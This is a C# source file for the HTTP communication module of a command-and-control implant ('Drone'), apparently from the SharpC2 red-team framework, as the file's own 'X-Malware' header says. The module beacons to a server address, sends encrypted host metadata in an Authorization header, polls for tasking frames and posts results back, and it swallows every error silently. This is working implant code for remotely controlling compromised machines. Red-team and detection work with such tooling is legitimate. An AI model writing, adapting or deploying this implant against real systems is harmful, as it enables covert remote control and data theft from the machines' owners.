using System;
using System.Collections.Generic;
using System.Net.Http;
using System.Threading.Tasks;

using Drone.Interfaces;

namespace Drone.CommModules;

public class HttpCommModule : ICommModule
{
    private HttpClient _client;
    
    public void Init(Metadata metadata)
    {
        _client = new HttpClient();
        _client.BaseAddress = new Uri($"{Schema}://{ConnectAddress}:{ConnectPort}");
        _client.DefaultRequestHeaders.Clear();

        var enc = Crypto.Encrypt(metadata);
        _client.DefaultRequestHeaders.Add("Authorization", $"Bearer {Convert.ToBase64String(enc)}");
        _client.DefaultRequestHeaders.Add("X-Malware", "SharpC2");
    }

    public async Task<IEnumerable<C2Frame>> ReadFrames()
    {
        try
        {
            var response = await _client.GetByteArrayAsync("/");
            return response.Deserialize<IEnumerable<C2Frame>>();
        }
        catch
        {
            return Array.Empty<C2Frame>();
        }
    }

    public async Task SendFrame(C2Frame frame)
    {
        var content = new ByteArrayContent(frame.Serialize());

        try
        {
            await _client.PostAsync("/", content);
        }
        catch
        {
            // ignore
        }
    }
    
    public void Dispose()
    {
        _client?.Dispose();
    }

    private static string Schema => "http";
    private static string ConnectAddress => "localhost";
    private static string ConnectPort => "8080";
}